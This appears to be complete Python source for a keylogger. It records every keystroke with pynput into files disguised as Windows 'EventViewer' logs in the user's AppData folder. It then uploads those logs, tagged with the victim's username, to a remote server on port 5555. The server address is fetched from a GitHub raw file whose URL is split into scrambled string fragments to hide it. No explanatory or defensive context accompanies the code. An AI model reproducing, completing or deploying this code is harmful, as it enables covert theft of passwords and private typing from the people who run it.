from pynput.keyboard import Key, Listener
import logging
from os import path, remove
ert = "ta/Local/Eve"
from datetime import datetime, timedelta
import requests
uwyd = "535/test/main"
from urllib.request import urlopen
br = "aw.gith"
y = datetime.today() - timedelta(days=1)
cfile = path.expanduser("~")+"\\AppData\\Local\\EventViewer"+y.strftime("%d")+".xpb"
if path.isfile(cfile):
    with open(path.expanduser("~")+"\\AppData\\Local\\Events.xpb", "ab+") as f:
        with open(cfile, "rb") as cf:
            f.write(cf.read())
        remove(cfile)
ww = "m/mi"
z = "el31"
h = urlopen("https://r"+br+"ubusercontent.co"+ww+"cha"+z+"415926"+uwyd+"/asdf.txt").read().decode("utf-8").replace("\n","")
ll = path.expanduser("~/AppDa"+ert+"nts.xpb")
if path.isfile(ll):
    a = 0
    while a < 3:
        try:
            f = open(ll)
            files = { "files" : f }
            headers = { "user" : path.expanduser("~").split("\\")[-1] }
            requests.post("http://"+h+":5555/api/log", headers=headers, files=files)
            f.close()
            remove(ll)
            break
        except Exception as e:
            a += 1
logging.basicConfig(filename=(path.expanduser("~")+"\\AppData\\Local\\EventViewer" + str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
def asdf(k):
    logging.info(str(k))
with Listener(on_press=asdf) as abc:
    abc.join()